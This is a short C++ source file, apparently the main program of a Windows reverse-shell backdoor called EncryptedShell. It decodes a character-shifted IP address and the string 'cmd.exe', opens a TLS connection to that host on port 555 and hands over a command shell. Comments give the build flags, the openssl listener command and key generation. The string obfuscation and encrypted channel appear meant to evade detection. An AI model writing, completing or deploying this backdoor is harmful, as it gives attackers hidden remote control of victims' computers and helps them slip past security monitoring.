#include "eshell.h"
//compile : g++ socket_winbd.cpp eshell.cpp try_eshell.cpp -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -I"C:\vcpkg\installed\x86-windows\include" -lssl -lcrypto -lws2_32 -lcrypt32 -lgdi32 -lz -m32
// Server : openssl s_server -quiet -key key.pem -cert cert.pem -port <port>
/*generate a key : openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
cat key.pem cert.pem > test.pem*/

using namespace std;

int main()
{
	int kk = 5;
	string host = "6>736;=3637<"; // 192.168.1.27 with EncryptedShell::encrypt_string
	string proc = "hri3j}j"; // cmd.exe with EncryptedShell::encrypt_string
	vector<char>dec_host;
	vector<char>dec_proc;
	
	for (int i = 0; i < host.size(); i++)
	{
		dec_host.push_back(host[i]);
	}

	for (int x = 0; x < proc.size(); x++)
	{
		dec_proc.push_back(proc[x]);
	}

	EncryptedShell e;
	string rhost = e.decrypt_string(dec_host, kk);
	string Pproc = e.decrypt_string(dec_proc, kk);
	EncryptedShell r(rhost, 555, AF_INET, (char*)Pproc.c_str());
	r.exec();
	return 0;
}